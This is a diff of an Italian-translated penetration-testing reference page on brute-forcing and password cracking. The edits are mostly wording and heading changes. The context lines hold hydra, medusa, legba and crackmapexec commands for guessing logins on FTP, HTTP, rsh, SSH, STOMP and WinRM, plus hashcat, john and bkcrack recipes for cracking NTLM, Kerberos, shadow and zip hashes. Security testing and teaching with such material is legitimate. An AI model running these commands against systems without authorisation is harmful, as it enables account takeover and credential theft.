@@ -34,9 +34,16 @@ crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using chars
 ^ Special characters including spac
 crunch 6 8 -t ,@@^^%%
 ```
-### Cewl
+### Elenchi di parole basati su siti web
 ```bash
+# Cewl gets words from the victims page
 cewl example.com -m 5 -w words.txt
+
+# Tok (https://github.com/tomnomnom/hacks/tree/master/tok) gets words from a list of URLs
+cat /path/to/urls.txt | tok
+
+# https://github.com/m4ll0k/BBTz/blob/master/getjswords.py gets words from a list of JS URLs
+cat /path/to/js-urls.txt | python3 getjswords.py
 ```
 ### [CUPP](https://github.com/Mebus/cupp)
 
@@ -128,11 +135,11 @@ ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
 medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
 legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
 ```
-### HTTP Generico Brute
+### HTTP Generic Brute
 
 #### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)
 
-### HTTP Autenticazione di Base
+### HTTP Basic Auth
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
 # Use https-get mode for https
@@ -144,7 +151,7 @@ legba http.basic --username admin --password wordlists/passwords.txt --target ht
 legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 ```
-### HTTP - Modulo Post
+### HTTP - Post Form
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
@@ -332,6 +339,8 @@ hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
 ```bash
 hydra -L <Username_list> rsh://<Victim_IP> -v -V
 ```
+[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)
+
 ### Rsync
 ```bash
 nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
@@ -393,11 +402,11 @@ legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --targ
 ```
 #### Chiavi SSH deboli / PRNG prevedibile di Debian
 
-Alcuni sistemi presentano difetti noti nel seme casuale utilizzato per generare materiale crittografico. Questo può portare a uno spazio di chiavi notevolmente ridotto che può essere attaccato con strumenti come [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Sono disponibili anche set pre-generati di chiavi deboli come [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
+Alcuni sistemi presentano difetti noti nel seme casuale utilizzato per generare materiale crittografico. Questo può risultare in uno spazio di chiavi notevolmente ridotto che può essere attaccato con strumenti come [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Sono disponibili anche set pre-generati di chiavi deboli come [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
 
 ### STOMP (ActiveMQ, RabbitMQ, HornetQ e OpenMQ)
 
-Il protocollo testuale STOMP è un protocollo di messaggistica ampiamente utilizzato che **consente comunicazioni e interazioni senza soluzione di continuità con i popolari servizi di messaggistica** come RabbitMQ, ActiveMQ, HornetQ e OpenMQ. Fornisce un approccio standardizzato ed efficiente per scambiare messaggi e svolgere varie operazioni di messaggistica.
+Il protocollo di testo STOMP è un protocollo di messaggistica ampiamente utilizzato che **consente comunicazioni e interazioni senza soluzione di continuità con i popolari servizi di messaggistica** come RabbitMQ, ActiveMQ, HornetQ e OpenMQ. Fornisce un approccio standardizzato ed efficiente per scambiare messaggi e svolgere varie operazioni di messaggistica.
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
@@ -440,7 +449,7 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ### Database di cracking online
 
 - [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
-- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 con/senza ESS/SSP e con qualsiasi valore della sfida)
+- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 con/senza ESS/SSP e con qualsiasi valore di sfida)
 - [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hash, catture WPA2 e archivi MSOffice, ZIP, PDF...)
 - [https://crackstation.net/](https://crackstation.net) (Hash)
 - [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
@@ -451,7 +460,7 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 - [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
 - [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
 
-Controlla questo prima di provare a forzare un Hash.
+Controlla questo prima di provare a forzare un Hash. 
 
 ### ZIP
 ```bash
@@ -469,9 +478,9 @@ john zip.john
 hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 .\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
 ```
-#### Attacco zip con testo in chiaro noto
+#### Attacco zip a testo in chiaro noto
 
-Devi conoscere il **testo in chiaro** (o parte del testo in chiaro) **di un file contenuto all'interno** dello zip crittografato. Puoi controllare **i nomi dei file e la dimensione dei file contenuti all'interno** di uno zip crittografato eseguendo: **`7z l encrypted.zip`**\
+È necessario conoscere il **testo in chiaro** (o parte del testo in chiaro) **di un file contenuto all'interno** dello zip crittografato. Puoi controllare **i nomi dei file e la dimensione dei file contenuti all'interno** di uno zip crittografato eseguendo: **`7z l encrypted.zip`**\
 Scarica [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) dalla pagina delle release.
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
@@ -506,7 +515,7 @@ qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
 ### PDF Owner Password
 
-Per decifrare una password di un PDF Owner controlla questo: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+Per decifrare una password di un PDF Owner, controlla questo: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 ```bash
@@ -542,7 +551,7 @@ hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ```
 ### Lucks image
 
-#### Metodo 1
+#### Method 1
 
 Installa: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
 ```bash
@@ -687,7 +696,7 @@ hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
 ## Use it to crack the password
 hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
 ```
-- Attacco Wordlist + Mask (`-a 6`) / Mask + Wordlist (`-a 7`)
+- Wordlist + Mask (`-a 6`) / Maschera + Wordlist (`-a 7`) attacco
 ```bash
 # Mask numbers will be appended to each word in the wordlist
 hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
@@ -699,19 +708,19 @@ hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 ```bash
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
-Cracking Linux Hashes - file /etc/shadow
+Cracking Linux Hashes - /etc/shadow file
 ```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
 3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
 7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
 1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
 ```
-Cracking delle Hash di Windows
+Cracking Windows Hashes
 ```
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
 ```
-Cracking delle Hash delle Applicazioni Comuni
+Cracking Common Application Hashes
 ```
 900 | MD4                                              | Raw Hash
 0 | MD5                                              | Raw Hash
